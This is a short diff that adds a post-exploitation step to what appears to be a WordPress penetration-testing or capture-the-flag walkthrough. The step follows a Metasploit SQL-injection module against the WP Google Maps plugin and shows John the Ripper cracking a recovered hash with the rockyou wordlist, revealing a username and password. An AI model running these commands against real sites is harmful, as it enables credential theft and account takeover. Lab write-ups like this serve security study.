@@ -130,3 +130,11 @@ msf auxillary(admin/http/wp_google_maps_sqli) > exploit
 -> credentials storage location found
 
 
+Exploit 5: WORDPRESS CREDENTIALS CRACKING VIA WP GOOGLE MAPS PLUGIN (POST-EXPLOITATION)
+kali$ nano wordpresshash.txt (save the hash in the file)
+kali$ ls /usr/share/wordlists/
+kali$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+kali$ john --wordlist=/usr/share/wordlists/rockyou.txt wordpresshash.txt
+-> username: webmaster, password: kittykat1 (found using john the ripper)
+
+
